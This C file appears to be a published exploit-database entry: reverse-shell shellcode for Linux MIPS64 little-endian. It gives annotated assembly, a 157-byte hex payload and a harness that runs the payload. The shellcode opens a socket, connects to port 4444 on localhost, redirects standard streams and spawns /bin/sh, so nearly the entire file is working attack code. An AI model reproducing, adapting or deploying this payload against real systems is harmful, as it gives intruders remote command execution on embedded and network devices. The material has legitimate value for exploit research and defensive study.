/*
 *    # Reverse shell shellcode for Linux MIPS64 (mips64el)
 *    # Default port: tcp/4444
 *    # Host: localhost
 *    # Date: August 19 - 2019
 *    # Author: Antonio de la Piedra
 *    # Tested on: MIPS Malta - Linux debian-mips64el 4.9.0-3-5kc-malta
 *    # Size: 157 bytes
 *    # Compile with: gcc -fno-stack-protector -z execstack main.c -o main -g
 */

#include <stdio.h>
#include <string.h>

/*
.text
        .global __start
__start:

        dli $s4, -3
        dli $s5, -17
        nor $a0,$s4,$zero
        nor $a1,$s4,$zero
        slti    $a2,$zero,-1
        li      $v0,5040
        syscall 0x40404

        sw   $v0, -32($sp)
        lw $a0, -32($sp)

        nor $t0,$s4,$zero
        sw $t0, -12($sp)
        dli     $t2,0x5c11
        sw      $t2,-10($sp)
        dli     $t1,0x0101017f
        sw      $t1,-8($sp)
        daddiu  $a1,$sp,-12
        nor $a2,$s5,$zero
        dli     $v0,5041
        syscall 0x40404

        nor $a1,$s4,$zero
        dli     $s0, -1
loop:
        dli     $v0,5032
        syscall 0x40404
        daddi   $a1,$a1,-1
        bne     $a1,$s0,loop
        dli     $t0,0x69622f2f
        sw      $t0,-12($sp)
        dli     $t1,0x68732f6e
        dli     $t1,0x68732f6e
        sw      $t1,-8($sp)
        sw      $zero,-4($sp)
        daddiu $a0,$sp,-12
        slti    $a1,$zero,-1
        slti    $a2,$zero,-1
        dli     $v0,5057
        syscall 0x40404
.align 8
*/

unsigned char code[] =
      "\xfd\xff\x14\x24"
      "\xfd\xff\x14\x24"
      "\xef\xff\x15\x24"
      "\x27\x20\x80\x02"
      "\x27\x28\x80\x02"
      "\xff\xff\x06\x28"
      "\xb0\x13\x02\x24"
      "\x0c\x01\x01\x01"
      "\xe0\xff\xa2\xaf"
      "\xe0\xff\xa4\x8f"
      "\x27\x60\x80\x02"
      "\xf4\xff\xac\xaf"
      "\x11\x5c\x0e\x24"
      "\xf6\xff\xae\xaf"
      "\x01\x01\x0d\x3c"
      "\x7f\x01\xad\x35"
      "\xf8\xff\xad\xaf"
      "\xf4\xff\xa5\x67"
      "\x27\x30\xa0\x02"
      "\xb1\x13\x02\x24"
      "\x0c\x01\x01\x01"
      "\x27\x28\x80\x02"
      "\xff\xff\x10\x24"
      "\xa8\x13\x02\x24"
      "\x0c\x01\x01\x01"
      "\xff\xff\xa5\x60"
      "\xfc\xff\xb0\x14"
      "\x62\x69\x0c\x3c"
      "\x2f\x2f\x8c\x35"
      "\xf4\xff\xac\xaf"
      "\x73\x68\x0d\x3c"
      "\x6e\x2f\xad\x35"
      "\xf8\xff\xad\xaf"
      "\xfc\xff\xa0\xaf"
      "\xf4\xff\xa4\x67"
      "\xff\xff\x05\x28"
      "\xff\xff\x06\x28"
      "\xc1\x13\x02\x24"
      "\x0c\x01\x01\x01";

int main(int argc, char ** argv)
{
        void(*s)(void);

        printf("Shellcode Length:  %d\n", strlen(code));

        s = code;
        s();

}